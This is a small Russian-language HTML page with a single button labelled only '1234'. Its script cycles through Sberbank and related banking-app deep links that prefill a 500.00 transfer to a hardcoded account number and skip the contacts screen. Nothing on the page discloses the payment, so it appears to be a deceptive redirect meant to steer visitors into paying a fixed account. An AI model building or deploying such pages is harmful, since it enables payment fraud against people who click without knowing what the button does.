<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Кнопки перенаправления</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            background-color: #f4f4f4;
        }
        button {
            margin: 10px;
            padding: 10px 20px;
            font-size: 16px;
            cursor: pointer;
        }
    </style>
    <script>
        function redirectToApps() {
            const amount = 500.00; // Сумма перевода
            const to = '40820810160340204582'; // Номер счета
            const urls = [
                `sberbankonline://p2ptransfer?amount=${amount.toFixed(2)}&isNeedToOpenNextScreen=true&skipContactsScreen=true&to=${to}&type=account`,
                `sbolonline://p2ptransfer?amount=${amount.toFixed(2)}&isNeedToOpenNextScreen=true&skipContactsScreen=true&to=${to}&type=account`,
                `ios-app-smartonline://p2ptransfer?amount=${amount.toFixed(2)}&isNeedToOpenNextScreen=true&skipContactsScreen=true&to=${to}&type=account`,
                `btripsexpenses://p2ptransfer?amount=${amount.toFixed(2)}&isNeedToOpenNextScreen=true&skipContactsScreen=true&to=${to}&type=account`
            ];

            let index = 0;

            function tryRedirect() {
                if (index < urls.length) {
                    window.location.href = urls[index];
                    index++;
                    setTimeout(tryRedirect, 100); // Пробуем следующую ссылку через 100 мс
                }
            }

            tryRedirect(); // Начинаем пробовать переходы
        }
    </script>
</head>
<body>

    <h1>универсальная кнопка</h1>
    <button onclick="redirectToApps()">1234</button>

</body>
</html>
